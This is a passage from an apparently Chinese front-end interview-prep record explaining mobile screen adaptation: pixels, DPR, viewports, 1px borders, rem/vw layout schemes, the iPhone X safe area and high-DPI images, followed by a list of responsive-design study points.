Inch)`：即每英寸包括的点数。\n\n这里的点是一个抽象的单位，它可以是屏幕像素点、图片像素点也可以是打印机的墨点。\n\n平时你可能会看到使用`DPI`来描述图片和屏幕，这时的`DPI`应该和`PPI`是等价的，`DPI`最常用的是用于描述打印机，表示打印机每英寸可以打印的点数。\n\n一张图片在屏幕上显示时，它的像素点数是规则排列的，每个像素点都有特定的位置和颜色。\n\n当使用打印机进行打印时，打印机可能不会规则的将这些点打印出来，而是使用一个个打印点来呈现这张图像，这些打印点之间会有一定的空隙，这就是`DPI`所描述的：打印点的密度。\n\n![](https://static.ecool.fun//article/c52f0ee9-8a7c-49d4-84cc-7d5cc83b50e4.png)\n\n\n在上面的图像中我们可以清晰的看到，打印机是如何使用墨点来打印一张图像。\n\n所以，打印机的`DPI`越高，打印图像的精细程度就越高，同时这也会消耗更多的墨点和时间。\n\n## 三、设备独立像素\n\n实际上，上面我们描述的像素都是`物理像素`，即设备上真实的物理单元。\n\n下面我们来看看`设备独立像素`究竟是如何产生的：\n\n智能手机发展非常之快，在几年之前，我们还用着分辨率非常低的手机，比如下面左侧的白色手机，它的分辨率是`320x480`，我们可以在上面浏览正常的文字、图片等等。\n\n但是，随着科技的发展，低分辨率的手机已经不能满足我们的需求了。很快，更高分辨率的屏幕诞生了，比如下面的黑色手机，它的分辨率是`640x940`，正好是白色手机的两倍。\n\n理论上来讲，在白色手机上相同大小的图片和文字，在黑色手机上会被缩放一倍，因为它的分辨率提高了一倍。这样，岂不是后面出现更高分辨率的手机，页面元素会变得越来越小吗？\n\n\n![](https://static.ecool.fun//article/9fe38ab0-1b5f-4486-8e06-853455263d98.png)\n\n\n然而，事实并不是这样的，我们现在使用的智能手机，不管分辨率多高，他们所展示的界面比例都是基本类似的。乔布斯在`iPhone4`的发布会上首次提出了`Retina Display`(视网膜屏幕)的概念，它正是解决了上面的问题，这也使它成为一款跨时代的手机。\n\n\n![](https://static.ecool.fun//article/9f0046fc-76b3-49fa-bff9-e0cd52ced14e.png)\n\n\n在`iPhone4`使用的视网膜屏幕中，把`2x2`个像素当`1`个像素使用，这样让屏幕看起来更精致，但是元素的大小却不会改变。\n\n\n![](https://static.ecool.fun//article/704437a6-efaa-4a9c-a06b-ba04b04928a8.png)\n\n\n如果黑色手机使用了视网膜屏幕的技术，那么显示结果应该是下面的情况，比如列表的宽度为`300`个像素，那么在一条水平线上，白色手机会用`300`个物理像素去渲染它，而黑色手机实际上会用`600`个物理像素去渲染它。\n\n我们必须用一种单位来同时告诉不同分辨率的手机，它们在界面上显示元素的大小是多少，这个单位就是设备独立像素(`Device Independent Pixels`)简称`DIP`或`DP`。上面我们说，列表的宽度为`300`个像素，实际上我们可以说：列表的宽度为`300`个设备独立像素。\n\n\n![](https://static.ecool.fun//article/f44bd38e-79c4-4ca1-ac92-c068d03ceac1.png)\n\n\n打开`chrome`的开发者工具，我们可以模拟各个手机型号的显示情况，每种型号上面会显示一个尺寸，比如`iPhone X`显示的尺寸是`375x812`，实际`iPhone X`的分辨率会比这高很多，这里显示的就是设备独立像素。\n\n\n![](https://static.ecool.fun//article/9ae35530-41b4-4ff3-a074-4a3030198a77.png)\n\n\n### 3.1 设备像素比\n\n设备像素比`device pixel ratio`简称`dpr`，即物理像素和设备独立像素的比值。\n\n在`web`中，浏览器为我们提供了`window.devicePixelRatio`来帮助我们获取`dpr`。\n\n在`css`中，可以使用媒体查询`min-device-pixel-ratio`，区分`dpr`：\n\n@media (-webkit-min-device-pixel-ratio: 2),(min-device-pixel-ratio: 2){ }\n\n在`React Native`中，我们也可以使用`PixelRatio.get()`来获取`DPR`。\n\n当然，上面的规则也有例外，`iPhone 6、7、8 Plus`的实际物理像素是`1080 x 1920`，在开发者工具中我们可以看到：它的设备独立像素是`414 x 736`，设备像素比为`3`，设备独立像素和设备像素比的乘积并不等于`1080 x 1920`，而是等于`1242 x 2208`。\n\n实际上，手机会自动把`1242 x 2208`个像素点塞进`1080 * 1920`个物理像素点来渲染，我们不用关心这个过程，而`1242 x 2208`被称为屏幕的`设计像素`。我们开发过程中也是以这个`设计像素`为准。\n\n实际上，从苹果提出视网膜屏幕开始，才出现设备像素比这个概念，因为在这之前，移动设备都是直接使用物理像素来进行展示。\n\n紧接着，`Android`同样使用了其他的技术方案来实现`DPR`大于`1`的屏幕，不过原理是类似的。由于`Android`屏幕尺寸非常多、分辨率高低跨度非常大，不像苹果只有它自己的几款固定设备、尺寸。所以，为了保证各种设备的显示效果，`Android`按照设备的像素密度将设备分成了几个区间：\n\n\n![](https://static.ecool.fun//article/90fdb0ac-90da-4eae-8694-c54d98cc2a2d.png)\n\n\n当然，所有的`Android`设备不一定严格按照上面的分辨率，每个类型可能对应几种不同分辨率，所以，每个`Android`手机都能根据给定的区间范围，确定自己的`DPR`，从而拥有类似的显示。当然，仅仅是类似，由于各个设备的尺寸、分辨率上的差异，设备独立像素也不会完全相等，所以各种`Android`设备仍然不能做到在展示上完全相等。\n\n### 3.2 移动端开发\n\n在`iOS`、`Android`和`React Native`开发中样式单位其实都使用的是设备独立像素。\n\n`iOS`的尺寸单位为`pt`，`Android`的尺寸单位为`dp`，`React Native`中没有指定明确的单位，它们其实都是设备独立像素`dp`。\n\n在使用`React Native`开发`App`时，`UI`给我们的原型图一般是基于`iphone6`的像素给定的。\n\n为了适配所有机型，我们在写样式时需要把物理像素转换为设备独立像素：例如：如果给定一个元素的高度为`200px`(这里的`px`指物理像素，非`CSS`像素)，`iphone6`的设备像素比为`2`，我们给定的`height`应为`200px/2=100dp`。\n\n当然，最好的是，你可以和设计沟通好，所有的`UI`图都按照设备独立像素来出。\n\n我们还可以在代码(`React Native`)中进行`px`和`dp`的转换：\n\n```js\nimport {PixelRatio } from 'react-native';\n\nconst dpr = PixelRatio.get();\n\n/**\n * px转换为dp\n */\nexport function pxConvertTodp(px) {\n  return px / dpr;\n}\n\n/**\n * dp转换为px\n */\nexport function dpConvertTopx(dp) {\n  return PixelRatio.getPixelSizeForLayoutSize(dp);\n}\n```\n\n### 3.3 WEB端开发\n\n在写`CSS`时，我们用到最多的单位是`px`，即`CSS像素`，当页面缩放比例为`100%`时，一个`CSS像素`等于一个设备独立像素。\n\n但是`CSS像素`是很容易被改变的，当用户对浏览器进行了放大，`CSS像素`会被放大，这时一个`CSS像素`会跨越更多的物理像素。\n\n`页面的缩放系数 = CSS像素 / 设备独立像素`。\n\n### 3.4 关于屏幕\n\n这里多说两句`Retina`屏幕，因为我在很多文章中看到对`Retina`屏幕的误解。\n\n`Retina`屏幕只是苹果提出的一个营销术语：\n\n> 在普通的使用距离下，人的肉眼无法分辨单个的像素点。\n\n为什么强调`普通的使用距离下`呢？我们来看一下它的计算公式：\n\n![](https://static.ecool.fun//article/369f26f4-3010-49d8-b14d-0afddca96494.png)\n\n`a`代表人眼视角，`h `代表像素间距，`d`代表肉眼与屏幕的距离，符合以上条件的屏幕可以使肉眼看不见单个物理像素点。\n\n它不能单纯的表达分辨率和`PPI`，只能一种表达视觉效果。\n\n让多个物理像素渲染一个独立像素只是`Retina`屏幕为了达到效果而使用的一种技术。而不是所有`DPR > 1`的屏幕就是`Retina`屏幕。\n\n比如：给你一块超大尺寸的屏幕，即使它的`PPI`很高，`DPR`也很高，在近距离你也能看清它的像素点，这就不算`Retina`屏幕。\n\n\n![](https://static.ecool.fun//article/519f11f4-2cce-46a2-8d6c-9d3babcf109e.png)\n\n\n我们经常见到用`K`和`P`这个单位来形容屏幕：\n\n`P`代表的就是屏幕纵向的像素个数，`1080P`即纵向有`1080`个像素，分辨率为`1920X1080`的屏幕就属于`1080P`屏幕。\n\n我们平时所说的高清屏其实就是屏幕的物理分辨率达到或超过`1920X1080`的屏幕。\n\n`K`代表屏幕横向有几个`1024`个像素，一般来讲横向像素超过`2048`就属于`2K`屏，横向像素超过`4096`就属于`4K`屏。\n\n## 四、视口\n\n视口(`viewport`)代表当前可见的计算机图形区域。在`Web`浏览器术语中，通常与浏览器窗口相同，但不包括浏览器的`UI`， 菜单栏等——即指你正在浏览的文档的那一部分。\n\n一般我们所说的视口共包括三种：布局视口、视觉视口和理想视口，它们在屏幕适配中起着非常重要的作用。\n\n### 4.1 布局视口\n\n\n![](https://static.ecool.fun//article/3202e8b3-f5d1-43fe-b65d-5e64384fa893.png)\n\n\n布局视口(`layout viewport`)：当我们以百分比来指定一个元素的大小时，它的计算值是由这个元素的包含块计算而来的。当这个元素是最顶级的元素时，它就是基于布局视口来计算的。\n\n所以，布局视口是网页布局的基准窗口，在`PC`浏览器上，布局视口就等于当前浏览器的窗口大小（不包括`borders` 、`margins`、滚动条）。\n\n在移动端，布局视口被赋予一个默认值，大部分为`980px`，这保证`PC`的网页可以在手机浏览器上呈现，但是非常小，用户可以手动对网页进行放大。\n\n我们可以通过调用`document.documentElement.clientWidth / clientHeight`来获取布局视口大小。\n\n### 4.2 视觉视口\n\n\n![](https://static.ecool.fun//article/6dd002e0-38bf-4b5d-918e-f8e3b6fcd557.png)\n\n\n视觉视口(`visual viewport`)：用户通过屏幕真实看到的区域。\n\n视觉视口默认等于当前浏览器的窗口大小（包括滚动条宽度）。\n\n当用户对浏览器进行缩放时，不会改变布局视口的大小，所以页面布局是不变的，但是缩放会改变视觉视口的大小。\n\n例如：用户将浏览器窗口放大了`200%`，这时浏览器窗口中的`CSS像素`会随着视觉视口的放大而放大，这时一个`CSS`像素会跨越更多的物理像素。\n\n所以，布局视口会限制你的`CSS`布局而视觉视口决定用户具体能看到什么。\n\n我们可以通过调用`window.innerWidth / innerHeight`来获取视觉视口大小。\n\n### 4.3 理想视口\n\n\n![](https://static.ecool.fun//article/90207808-c96e-406c-bd5f-2ab4eb7dc646.png)\n\n\n布局视口在移动端展示的效果并不是一个理想的效果，所以理想视口(`ideal viewport`)就诞生了：网站页面在移动端展示的理想大小。\n\n如上图，我们在描述设备独立像素时曾使用过这张图，在浏览器调试移动端时页面上给定的像素大小就是理想视口大小，它的单位正是设备独立像素。\n\n上面在介绍`CSS像素时`曾经提到`页面的缩放系数 = CSS像素 / 设备独立像素`，实际上说`页面的缩放系数 = 理想视口宽度 / 视觉视口宽度`更为准确。\n\n所以，当页面缩放比例为`100%`时，`CSS像素 = 设备独立像素`，`理想视口 = 视觉视口`。\n\n我们可以通过调用`screen.width / height`来获取理想视口大小。\n\n### 4.4 Meta viewport\n\n`<meta>` 元素表示那些不能由其它`HTML`元相关元素之一表示的任何元数据信息，它可以告诉浏览器如何解析页面。\n\n我们可以借助`<meta>`元素的`viewport`来帮助我们设置视口、缩放等，从而让移动端得到更好的展示效果。\n\n<meta name=\"viewport\" content=\"width=device-width; initial-scale=1; maximum-scale=1; minimum-scale=1; user-scalable=no;\">\n\n上面是`viewport`的一个配置，我们来看看它们的具体含义：\n\n| Value         | 可能值               | 描述                               |\n| ------------- | ----------------- | -------------------------------- |\n| width         | 正整数或device-width  | 以pixels（像素）为单位， 定义布局视口的宽度。       |\n| height        | 正整数或device-height | 以pixels（像素）为单位， 定义布局视口的高度。       |\n| initial-scale | 0.0 - 10.0        | 定义页面初始缩放比率。                      |\n| minimum-scale | 0.0 - 10.0        | 定义缩放的最小值；必须小于或等于maximum-scale的值。 |\n| maximum-scale | 0.0 - 10.0        | 定义缩放的最大值；必须大于或等于minimum-scale的值。 |\n| user-scalable | 一个布尔值（yes或者no）    | 如果设置为 no，用户将不能放大或缩小网页。默认值为 yes。  |\n\n### 4.5 移动端适配\n\n为了在移动端让页面获得更好的显示效果，我们必须让布局视口、视觉视口都尽可能等于理想视口。\n\n`device-width`就等于理想视口的宽度，所以设置`width=device-width`就相当于让布局视口等于理想视口。\n\n由于`initial-scale = 理想视口宽度 / 视觉视口宽度`，所以我们设置`initial-scale=1;`就相当于让视觉视口等于理想视口。\n\n这时，1个`CSS`像素就等于1个设备独立像素，而且我们也是基于理想视口来进行布局的，所以呈现出来的页面布局在各种设备上都能大致相似。\n\n### 4.6 缩放\n\n上面提到`width`可以决定布局视口的宽度，实际上它并不是布局视口的唯一决定性因素，设置`initial-scale`也有肯能影响到布局视口，因为布局视口宽度取的是`width`和视觉视口宽度的最大值。\n\n例如：若手机的理想视口宽度为`400px`，设置`width=device-width`，`initial-scale=2`，此时`视觉视口宽度 = 理想视口宽度 / initial-scale`即`200px`，布局视口取两者最大值即`device-width` `400px`。\n\n若设置`width=device-width`，`initial-scale=0.5`，此时`视觉视口宽度 = 理想视口宽度 / initial-scale`即`800px`，布局视口取两者最大值即`800px`。\n\n### 4.7 获取浏览器大小\n\n浏览器为我们提供的获取窗口大小的`API`有很多，下面我们再来对比一下：\n\n\n![](https://static.ecool.fun//article/de1bf992-e469-4eff-8980-3ffb888606d5.png)\n\n\n* `window.innerHeight`：获取浏览器视觉视口高度（包括垂直滚动条）。\n* `window.outerHeight`：获取浏览器窗口外部的高度。表示整个浏览器窗口的高度，包括侧边栏、窗口镶边和调正窗口大小的边框。\n* `window.screen.Height`：获取获屏幕取理想视口高度，这个数值是固定的，`设备的分辨率/设备像素比`\n* `window.screen.availHeight`：浏览器窗口可用的高度。\n* `document.documentElement.clientHeight`：获取浏览器布局视口高度，包括内边距，但不包括垂直滚动条、边框和外边距。\n* `document.documentElement.offsetHeight`：包括内边距、滚动条、边框和外边距。\n* `document.documentElement.scrollHeight`：在不使用滚动条的情况下适合视口中的所有内容所需的最小宽度。测量方式与`clientHeight`相同：它包含元素的内边距，但不包括边框，外边距或垂直滚动条。\n\n## 五、1px问题\n\n为了适配各种屏幕，我们写代码时一般使用设备独立像素来对页面进行布局。\n\n而在设备像素比大于`1`的屏幕上，我们写的`1px`实际上是被多个物理像素渲染，这就会出现`1px`在有些屏幕上看起来很粗的现象。\n\n### 5.1 border-image\n\n基于`media`查询判断不同的设备像素比给定不同的`border-image`：\n\n```css\n       .border_1px{\n          border-bottom: 1px solid #000;\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:2){\n            .border_1px{\n                border-bottom: none;\n                border-width: 0 0 1px 0;\n                border-image: url(../img/1pxline.png) 0 0 2 0 stretch;\n            }\n        }\n```\n\n### 5.2 background-image\n\n和`border-image`类似，准备一张符合条件的边框背景图，模拟在背景上。\n\n```css\n       .border_1px{\n          border-bottom: 1px solid #000;\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:2){\n            .border_1px{\n                background: url(../img/1pxline.png) repeat-x left bottom;\n                background-size: 100% 1px;\n            }\n        }\n```\n\n上面两种都需要单独准备图片，而且圆角不是很好处理，但是可以应对大部分场景。\n\n### 5.3 伪类 + transform\n\n基于`media`查询判断不同的设备像素比对线条进行缩放：\n\n```css\n       .border_1px:before{\n          content: '';\n          position: absolute;\n          top: 0;\n          height: 1px;\n          width: 100%;\n          background-color: #000;\n          transform-origin: 50% 0%;\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:2){\n            .border_1px:before{\n                transform: scaleY(0.5);\n            }\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:3){\n            .border_1px:before{\n                transform: scaleY(0.33);\n            }\n        }\n```\n\n这种方式可以满足各种场景，如果需要满足圆角，只需要给伪类也加上`border-radius`即可。\n\n### 5.4 svg\n\n上面我们`border-image`和`background-image`都可以模拟`1px`边框，但是使用的都是位图，还需要外部引入。\n\n借助`PostCSS`的`postcss-write-svg`我们能直接使用`border-image`和`background-image`创建`svg`的`1px`边框：\n\n```css\n@svg border_1px { \n  height: 2px; \n  @rect { \n    fill: var(--color, black); \n    width: 100%; \n    height: 50%; \n    } \n  } \n.example { border: 1px solid transparent; border-image: svg(border_1px param(--color #00b1ff)) 2 2 stretch; }\n```\n\n编译后：\n```css\n.example { border: 1px solid transparent; border-image: url(\"data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' height='2px'%3E%3Crect fill='%2300b1ff' width='100%25' height='50%25'/%3E%3C/svg%3E\") 2 2 stretch; }\n```\n\n上面的方案是大漠在他的文章中推荐使用的，基本可以满足所有场景，而且不需要外部引入，这是我个人比较喜欢的一种方案。\n\n### 5.5 设置viewport\n\n通过设置缩放，让`CSS`像素等于真正的物理像素。\n\n例如：当设备像素比为`3`时，我们将页面缩放`1/3`倍，这时`1px`等于一个真正的屏幕像素。\n```css\n    const scale = 1 / window.devicePixelRatio;\n    const viewport = document.querySelector('meta[name=\"viewport\"]');\n    if (!viewport) {\n        viewport = document.createElement('meta');\n        viewport.setAttribute('name', 'viewport');\n        window.document.head.appendChild(viewport);\n    }\n    viewport.setAttribute('content', 'width=device-width,user-scalable=no,initial-scale=' + scale + ',maximum-scale=' + scale + ',minimum-scale=' + scale);\n```\n\n实际上，上面这种方案是早先`flexible`采用的方案。\n\n当然，这样做是要付出代价的，这意味着你页面上所有的布局都要按照物理像素来写。这显然是不现实的，这时，我们可以借助`flexible`或`vw、vh`来帮助我们进行适配。\n\n## 六、移动端适配方案\n\n尽管我们可以使用设备独立像素来保证各个设备在不同手机上显示的效果类似，但这并不能保证它们显示完全一致，我们需要一种方案来让设计稿得到更完美的适配。\n\n### 6.1 flexible方案\n\n`flexible`方案是阿里早期开源的一个移动端适配解决方案，引用`flexible`后，我们在页面上统一使用`rem`来布局。\n\n它的核心代码非常简单：\n\n```js\n// set 1rem = viewWidth / 10\nfunction setRemUnit () {\n    var rem = docEl.clientWidth / 10\n    docEl.style.fontSize = rem + 'px'\n}\nsetRemUnit();\n```\n\n`rem` 是相对于`html`节点的`font-size`来做计算的。\n\n我们通过设置`document.documentElement.style.fontSize`就可以统一整个页面的布局标准。\n\n上面的代码中，将`html`节点的`font-size`设置为页面`clientWidth`(布局视口)的`1/10`，即`1rem`就等于页面布局视口的`1/10`，这就意味着我们后面使用的`rem`都是按照页面比例来计算的。\n\n这时，我们只需要将`UI`出的图转换为`rem`即可。\n\n以`iPhone6`为例：布局视口为`375px`，则`1rem = 37.5px`，这时`UI`给定一个元素的宽为`75px`（设备独立像素），我们只需要将它设置为`75 / 37.5 = 2rem`。\n\n当然，每个布局都要计算非常繁琐，我们可以借助`PostCSS`的`px2rem`插件来帮助我们完成这个过程。\n\n下面的代码可以保证在页面大小变化时，布局可以自适应，当触发了`window`的`resize`和`pageShow`事件之后自动调整`html`的`fontSize`大小。\n\n```js\n  // reset rem unit on page resize\nwindow.addEventListener('resize', setRemUnit)window.addEventListener('pageshow', function (e) {\n    if (e.persisted) {\n      setRemUnit()\n    }\n})\n```\n\n由于`viewport`单位得到众多浏览器的兼容，上面这种方案现在已经被官方弃用：\n\n> lib-flexible这个过渡方案已经可以放弃使用，不管是现在的版本还是以前的版本，都存有一定的问题。建议大家开始使用viewport来替代此方案。\n\n下面我们来看看现在最流行的`vh、vw`方案。\n\n### 6.2 vh、vw方案\n\n`vh、vw`方案即将视觉视口宽度 `window.innerWidth `和视觉视口高度 `window.innerHeight` 等分为 100 份。\n\n上面的`flexible`方案就是模仿这种方案，因为早些时候`vw`还没有得到很好的兼容。\n\n* `vw(Viewport's width)`：`1vw`等于视觉视口的`1%`\n* `vh(Viewport's height)` :` 1vh` 为视觉视口高度的`1%`\n* `vmin` : `vw` 和 `vh` 中的较小值\n* `vmax` : 选取 `vw` 和 `vh` 中的较大值\n\n\n![](https://static.ecool.fun//article/8d86415a-2f87-4dc1-8b44-b9036b869ffb.png)\n\n\n如果视觉视口为`375px`，那么`1vw = 3.75px`，这时`UI`给定一个元素的宽为`75px`（设备独立像素），我们只需要将它设置为`75 / 3.75 = 20vw`。\n\n这里的比例关系我们也不用自己换算，我们可以使用`PostCSS`的 `postcss-px-to-viewport` 插件帮我们完成这个过程。写代码时，我们只需要根据`UI`给的设计图写`px`单位即可。\n\n当然，没有一种方案是十全十美的，`vw`同样有一定的缺陷：\n\n* `px`转换成`vw`不一定能完全整除，因此有一定的像素差。\n* 比如当容器使用`vw`，`margin`采用`px`时，很容易造成整体宽度超过`100vw`，从而影响布局效果。当然我们也是可以避免的，例如使用`padding`代替`margin`，结合`calc()`函数使用等等...\n\n## 七、适配iPhoneX\n\n`iPhoneX`的出现将手机的颜值带上了一个新的高度，它取消了物理按键，改成了底部的小黑条，但是这样的改动给开发者适配移动端又增加了难度。\n\n### 7.1 安全区域\n\n在`iPhoneX`发布后，许多厂商相继推出了具有边缘屏幕的手机。\n\n\n![](https://static.ecool.fun//article/5863eb79-4c88-4b5b-a28b-896cadf0d995.png)\n\n\n这些手机和普通手机在外观上无外乎做了三个改动：圆角（`corners`）、刘海（`sensor housing`）和小黑条（`Home Indicator`）。为了适配这些手机，安全区域这个概念变诞生了：安全区域就是一个不受上面三个效果的可视窗口范围。\n\n为了保证页面的显示效果，我们必须把页面限制在安全范围内，但是不影响整体效果。\n\n### 7.2 viewport-fit\n\n`viewport-fit`是专门为了适配`iPhoneX`而诞生的一个属性，它用于限制网页如何在安全区域内进行展示。\n\n\n![](https://static.ecool.fun//article/78f48d28-beed-4ae3-99eb-97fb1f90f026.png)\n\n\n`contain`: 可视窗口完全包含网页内容\n\n`cover`：网页内容完全覆盖可视窗口\n\n默认情况下或者设置为`auto`和`contain`效果相同。\n\n### 7.3 env、constant\n\n\n![](https://static.ecool.fun//article/1a9e5f78-bd40-48af-a03e-ebe28c2cca0e.png)\n\n\n我们需要将顶部和底部合理的摆放在安全区域内，`iOS11`新增了两个`CSS`函数`env、constant`，用于设定安全区域与边界的距离。\n\n函数内部可以是四个常量：\n\n* `safe-area-inset-left`：安全区域距离左边边界距离\n* `safe-area-inset-right`：安全区域距离右边边界距离\n* `safe-area-inset-top`：安全区域距离顶部边界距离\n* `safe-area-inset-bottom`：安全区域距离底部边界距离\n\n注意：我们必须指定`viweport-fit`后才能使用这两个函数：\n\n```\n<meta name=\"viewport\" content=\"viewport-fit=cover\">\n```\n\n`constant`在`iOS < 11.2`的版本中生效，`env`在`iOS >= 11.2`的版本中生效，这意味着我们往往要同时设置他们，将页面限制在安全区域内：\n```css\nbody {\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n```\n\n当使用底部固定导航栏时，我们要为他们设置`padding`值：\n```css\n{\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n```\n## 八、横屏适配\n\n\n![](https://static.ecool.fun//article/283be819-f072-4f87-a159-20e2e9bad896.png)\n\n\n很多视口我们要对横屏和竖屏显示不同的布局，所以我们需要检测在不同的场景下给定不同的样式：\n\n### 8.1 JavaScript检测横屏\n\n`window.orientation`:获取屏幕旋转方向\n```js\nwindow.addEventListener(\"resize\", ()=>{\n    if (window.orientation === 180 || window.orientation === 0) { \n      // 正常方向或屏幕旋转180度\n        console.log('竖屏');\n    };\n    if (window.orientation === 90 || window.orientation === -90 ){ \n       // 屏幕顺时钟旋转90度或屏幕逆时针旋转90度\n        console.log('横屏');\n    }  \n}); \n```\n\n### 8.2 CSS检测横屏\n\n```css\n@media screen and (orientation: portrait) {\n  /*竖屏...*/\n} \n@media screen and (orientation: landscape) {\n  /*横屏...*/\n}\n```\n\n## 九、图片模糊问题\n\n### 9.1 产生原因\n\n我们平时使用的图片大多数都属于位图（`png、jpg...`），位图由一个个像素点构成的，每个像素都具有特定的位置和颜色值：\n\n\n![](https://static.ecool.fun//article/df7f9f25-57ff-472f-b91b-405383f12eb3.png)\n\n\n理论上，位图的每个像素对应在屏幕上使用一个物理像素来渲染，才能达到最佳的显示效果。\n\n而在`dpr > 1`的屏幕上，位图的一个像素可能由多个物理像素来渲染，然而这些物理像素点并不能被准确的分配上对应位图像素的颜色，只能取近似值，所以相同的图片在`dpr > 1`的屏幕上就会模糊:\n\n\n![](https://static.ecool.fun//article/054230dc-3773-4f4d-9aab-21ec56e39f3c.png)\n\n\n### 9.2 解决方案\n\n为了保证图片质量，我们应该尽可能让一个屏幕像素来渲染一个图片像素，所以，针对不同`DPR`的屏幕，我们需要展示不同分辨率的图片。\n\n如：在`dpr=2`的屏幕上展示两倍图`(@2x)`，在`dpr=3`的屏幕上展示三倍图`(@3x)`。\n\n\n![](https://static.ecool.fun//article/60b138d0-3875-4a5f-9dd6-9d8d84692cc6.png)\n\n\n### 9.3 media查询\n\n使用`media`查询判断不同的设备像素比来显示不同精度的图片：\n\n```css\n       .avatar{\n            background-image: url(conardLi_1x.png);\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:2){\n            .avatar{\n                background-image: url(conardLi_2x.png);\n            }\n        }\n        @media only screen and (-webkit-min-device-pixel-ratio:3){\n            .avatar{\n                background-image: url(conardLi_3x.png);\n            }\n        }\n```\n\n> 只适用于背景图\n\n### 9.4 image-set\n\n使用`image-set`：\n\n```css\n.avatar {\n    background-image: -webkit-image-set( \"conardLi_1x.png\" 1x, \"conardLi_2x.png\" 2x );\n}\n```\n\n> 只适用于背景图\n\n### 9.5 srcset\n\n使用`img`标签的`srcset`属性，浏览器会自动根据像素密度匹配最佳显示图片：\n\n```html\n<img src=\"conardLi_1x.png\"\n     srcset=\" conardLi_2x.png 2x, conardLi_3x.png 3x\">\n```\n\n### 9.6 JavaScript拼接图片url\n\n使用`window.devicePixelRatio`获取设备像素比，遍历所有图片，替换图片地址：\n\n```js\nconst dpr = window.devicePixelRatio;\nconst images =  document.querySelectorAll('img');\nimages.forEach((img)=>{\n  img.src.replace(\".\", `@${dpr}x.`);\n})\n```\n\n### 9.7 使用svg\n\n`SVG `的全称是可缩放矢量图（`Scalable Vector Graphics`）。不同于位图的基于像素，`SVG` 则是属于对图像的形状描述，所以它本质上是文本文件，体积较小，且不管放大多少倍都不会失真。\n\n\n![](https://static.ecool.fun//article/fd0b6991-dd94-4762-b942-f388479edc4a.png)\n\n\n除了我们手动在代码中绘制`svg`，我们还可以像使用位图一样使用`svg`图片：\n\n```html\n<img src=\"conardLi.svg\">\n\n<img src=\"data:image/svg+xml;base64,[data]\">\n\n.avatar {\n  background: url(conardLi.svg);\n}\n```",
    "testPoint": "### 1. **基本概念与响应式设计**\n   - **响应式设计的定义**：什么是响应式设计？它的核心目标是什么？\n   - **设计思路**：如何通过流体网格布局、弹性图片和媒体查询等手段实现页面在不同屏幕上的自适应？\n   - **常见单位**：移动端适配中，何时使用 `px`、`%`、`em`、`rem` 和 `vw/vh` 等单位？各自的优缺点是什么？\n\n### 2. **视口（Viewport）和 meta 标签**\n   - **视口设置**：什么是视口（viewport）？在 HTML 中如何通过 `<meta>` 标签设置视口？\n   - **常见视口配置**：解释 `width=device-width`、`initial-scale=1.0` 的作用。\n   - **最佳实践**：在开发移动端页面时，如何合理配置 `<meta name=\"viewport\">` 标签？\n\n### 3. **媒体查询（Media Queries）**\n   - **定义和语法**：什么是媒体查询？其基本语法结构如何？\n   - **常用断点**：在实际开发中，哪些断点（如 320px、768px、1024px 等）适合用作媒体查询的条件？\n   - **响应式适配**：如何利用媒体查询来调整页面布局、字体、图片大小，使其适应不同的屏幕宽度？\n\n### 4. **Flexible 布局（flex 布局）**\n   - **Flexbox 的优点**：flex 布局如何简化移动端适配？它的常见使用场景有哪些？\n   - **flex 布局的核心属性**：如 `justify-content`、`align-items`、`flex-wrap` 等属性在不同屏幕尺寸下的应用。\n   - **实践案例**：如何使用 flex 实现不同屏幕下内容的居中、左右对齐或按比例分布？\n\n### 5. **弹性图片和视频**\n   - **图片的自适应**：如何设置图片宽度为 100%，确保图片在小屏幕下不溢出？ `max-width: 100%` 的作用是什么？\n   - **视频适配**：如何让视频在移动端自适应？例如设置 `width: 100%` 或 `aspect-ratio` 等。\n\n### 6. **Rem 和 Em 的使用**\n   - **Rem 与 Em 的区别**：在移动端适配中，如何选择 rem 和 em 作为单位？它们分别相对于什么进行计算？\n   - **基准字体设置**：如何利用 `html` 标签上的 `font-size` 设置 rem 的基准值，以便页面根据设备大小调整文字大小？\n\n### 7. **百分比布局**\n   - **适用场景**：何时应该使用百分比布局？如何利用百分比宽度设置实现自适应布局？\n   - **组合使用**：在百分比布局中如何搭配 `max-width` 等属性，防止内容在大屏幕上过度拉伸？\n\n### 8. **Flex 和 Grid 的混合布局**\n   - **组合应用**：如何同时使用 flex 和 grid 布局，以满足移动端和 PC 端的适配需求？\n   - **断点优化**：在小屏幕下切换到 flex 布局，大屏幕则使用 grid 的场景和实现方式。\n\n### 9. **CSS vw、vh 单位**\n   - **单位特点**：vw 和 vh 的定义，如何根据视口宽度或高度进行适配？\n   - **动态调整**：如何使用 `vw` 实现基于屏幕宽度的响应式排版？例如字体大小、外边距的自适应。\n\n### 10. **移动端点击区域的优化**\n   - **交互体验**：移动端点击区域的建议尺寸是多少？如何确保按钮和链接的点击区域不小于 44px x 44px？\n   - **误触问题**：在多按钮布局时，如何使用 `padding` 增加点击区域，减少误触？\n\n### 11. **Retina 屏幕适配**\n   - **高清屏幕**：什么是 Retina 屏幕？为什么需要对高分辨率屏幕进行适配？\n   - **高清图片**：如何为 Retina 屏幕加载 2x 或 3x 图片？举例说明使用 `srcset` 和 `sizes` 属性的方式。\n   - **Icon 和 SVG**：如何使用 SVG 矢量图或 Icon Font 解决 Retina 屏幕的模糊问题？\n\n### 12. **移动端性能优化**\n   - **文件体积优化**：如何通过压缩图片、使用合适格式（如 WebP）减少文件体积，提升加载速度？\n   - **懒加载**：如何使用懒加载（Lazy Loading）优化图片、视频资源的加载？\n   - **减少回流与重绘**：如何优化布局和动画，减少页面在移动设备上的回流和重绘？\n\n### 13. **视口单位和字体动态适配**\n   - **视口单位**：如何通过 `vw`、`vh`、`vmin` 等实现字体的动态适配？\n   - **结合媒体查询**：在字体大小适配上如何结合媒体查询，确保不同屏幕上的可读性？\n\n### 14. **CSS Clamp() 函数**\n   - **动态调整**：如何使用 `clamp()` 函数动态控制属性值的最小值、最大值和中间值，达到自适应效果？\n   - **字体适配**：如何使用 `clamp()` 